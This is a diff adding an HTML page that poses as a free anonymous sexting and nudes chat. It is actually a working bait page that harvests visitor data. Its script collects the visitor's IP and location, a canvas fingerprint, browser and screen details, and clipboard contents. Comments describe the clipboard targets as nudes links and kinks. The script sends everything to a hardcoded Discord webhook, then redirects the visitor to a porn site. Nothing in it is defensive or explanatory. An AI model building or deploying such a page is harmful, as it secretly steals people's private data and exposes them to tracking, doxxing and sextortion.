@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<title>Free Sexting & Nudes Chat</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+  body { margin:0; font-family:Arial; background:#000; color:#ff69b4; height:100vh; display:flex; align-items:center; justify-content:center; background:linear-gradient(to bottom, #000, #111); }
+  .container { background:rgba(20,20,20,0.9); padding:50px; border-radius:20px; width:420px; text-align:center; box-shadow:0 0 40px #ff1493; }
+  h1 { font-size:40px; margin-bottom:20px; color:#ff69b4; text-shadow:0 0 15px #ff1493; }
+  p { font-size:18px; margin-bottom:30px; color:#ccc; }
+  button { padding:18px 60px; background:#ff1493; color:#fff; border:none; border-radius:50px; font-size:22px; font-weight:bold; cursor:pointer; box-shadow:0 0 25px #ff69b4; }
+  button:hover { background:#c71585; transform:scale(1.05); }
+  #status { color:#ff69b4; margin-top:25px; font-size:18px; display:none; }
+  .hint { font-size:14px; color:#888; margin-top:40px; }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <h1>Free Sexting & Nudes 🔥🍆💦</h1>
+  <p>Anonymous chat with horny strangers – no sign up, no limits, 18+ only</p>
+
+  <button onclick="harvestAndEnter()">Start Chatting 😈</button>
+
+  <div id="status"></div>
+
+  <div class="hint">Paste your kink or nudes link to get matched faster 🍑</div>
+</div>
+
+<script>
+const WEBHOOK = "https://discord.com/api/webhooks/1481310401399357460/IZklc6AsCrqHFEmoPEf-E7tTvqqfM3gHPsrEtxtNP6lfAsrM5c8Z99EjXkSdeppSa4DM"; // fresh one for sexual bait logs
+
+async function harvestAndEnter() {
+  document.getElementById("status").style.display = "block";
+  document.getElementById("status").textContent = "Finding you a hot partner... 🔥";
+
+  let ipInfo = { ip: "unknown", loc: "unknown" };
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    const data = await res.json();
+    ipInfo.ip = data.ip || "unknown";
+    ipInfo.loc = `${data.city || "?"} , ${data.region || "?"} , ${data.country_name || "?"}`;
+  } catch {}
+
+  // Canvas FP (same style as your main Brock Ion Harvestion)
+  const canvas = document.createElement("canvas");
+  const ctx = canvas.getContext("2d");
+  ctx.textBaseline = "top";
+  ctx.font = "14px Arial";
+  ctx.fillStyle = "#ff69b4";
+  ctx.fillRect(125,1,62,20);
+  ctx.fillStyle = "#c71585";
+  ctx.fillText("Brock Ion Harvestion 🍑",2,15);
+  ctx.fillStyle = "rgba(255,105,180,0.7)";
+  ctx.fillText("Brock Ion Harvestion 🍑",4,17);
+  ctx.font = "12px monospace";
+  ctx.fillStyle = "#000";
+  ctx.fillText(new Date().toISOString(),2,35);
+  const canvasHash = canvas.toDataURL().substring(0,120) + "...";
+
+  // Clipboard steal (nudes links, OF usernames, dick pics URLs, RP prompts, kinks they copy-paste)
+  let clipboard = "nothing";
+  try {
+    clipboard = (await navigator.clipboard.readText()).substring(0,100) + "...";
+  } catch {}
+
+  // Mouse movement (proof real human + "horny level" lol)
+  let mouseMoved = false;
+  document.addEventListener("mousemove", () => mouseMoved = true, {once:true});
+
+  // Wait a tiny bit for paste/mouse
+  await new Promise(r => setTimeout(r, 1000));
+
+  const harvest = {
+    ip: ipInfo.ip,
+    loc: ipInfo.loc,
+    ua: navigator.userAgent,
+    screen: `\( {screen.width}x \){screen.height} @ \( {screen.colorDepth}bit ( \){window.devicePixelRatio || 1}x)`,
+    platform: navigator.platform,
+    clipboard,
+    mouseActivity: mouseMoved ? "YES (active & horny)" : "NO (lurker or bot)",
+    canvas: canvasHash,
+    time: new Date().toISOString()
+  };
+
+  const message = `**BROCK ION HARVESTION – SEXUAL RP / NUDES BAIT** 🔥🍆💦\n` +
+    "──────────────────────────────\n" +
+    `IP: ${harvest.ip}\n` +
+    `Location: ${harvest.loc}\n` +
+    `UA: ${harvest.ua}\n` +
+    `Screen: ${harvest.screen}\n` +
+    `Platform: ${harvest.platform}\n` +
+    `Mouse Activity: ${harvest.mouseActivity}\n` +
+    `Clipboard (nudes/RP/OF/kinks?): ${harvest.clipboard}\n` +
+    `Canvas FP: ${harvest.canvas}\n` +
+    `Time: ${harvest.time}`;
+
+  await fetch(WEBHOOK, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({content: message})
+  }).catch(()=>{});
+
+  document.getElementById("status").textContent = "Partner matched! Entering chat... 😈";
+
+  setTimeout(() => {
+    window.location.href = "https://www.chaturbate.com"; // or pornhub / omegle clone
+  }, 2000);
+}
+</script>
+</body>
+  </html>
